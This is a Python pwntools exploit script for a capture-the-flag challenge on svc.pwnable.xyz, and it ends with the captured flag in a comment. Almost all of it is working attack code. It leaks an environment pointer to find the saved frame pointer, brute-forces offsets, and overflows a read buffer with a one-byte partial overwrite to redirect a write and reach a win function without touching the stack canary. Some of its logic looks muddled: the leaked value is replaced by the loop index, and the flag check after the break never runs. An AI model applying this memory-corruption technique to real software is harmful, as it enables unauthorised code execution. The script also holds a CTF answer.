from pwn import *
import time

for i in range(0, 512, 4):
    print("offset: ", i)
    try:
    # so the goal is to overflow the read buffer to overwrite part of memory and somehow not clobber the canary 
        #r = process('./challenge')
        r = remote('svc.pwnable.xyz', 30012)

        l = r.sendlineafter("> ", "3")

        # grabbing the environment pointer 
        l = int(r.recvline().decode().strip(),16)
        print("environment leak: ", hex(l))
        offset = 0xe038 - 0xdf10
        original_rbp = l - offset # this is environment leak from gdb - rbp from gdb 
        '''
        ---
        | canary
        | win function to modify  <-- 0xdf08
        | original rbp     <-- 0xdf10
        '''
        # because the write happens at 0x11 bytes away we need to do 0x11 - 0x8 = 0x9 
        # so it becomes rbp + 0x11 (byte to write after finishing read_int8 function) - 0x8 bytes (win offset from original)
        print("original rbp: ", hex(original_rbp))
        gscript='''
        b read_int8
        '''
        #gdb.attach(r, gdbscript=gscript)
        original_rbp = i

        padding = b"A" * 0x20
        modifier = ((original_rbp & 0xff) - 0x8 + 0x11).to_bytes(1,byteorder='little')
        payload = padding + modifier
        print("New Address: ", modifier)
        print("Payload: ", payload)
        r.sendafter("> ", payload) # modify the address of the function

        r.sendafter("> ", str(0x77)) # write the byte to the address

        modifier = (original_rbp & 0xff).to_bytes(1, byteorder='little')
        print("Sending byte: ", str(hex(original_rbp & 0xff))[2:])
        r.sendafter("> ", padding + modifier) # modify the address back to the original value

        r.sendafter("> ", "1")
        l = r.recv()
        print("line is: ", l)
        l = r.recv()
        print(l)
        time.sleep(2)

        r.close()

        break
        
        if b'FLAG' in l:
            print(l)
            input()
        
    #    time.sleep(5)

    except:
        continue

# Flag: b'FLAG{jumping_the_stack_pointer_is_fun}'


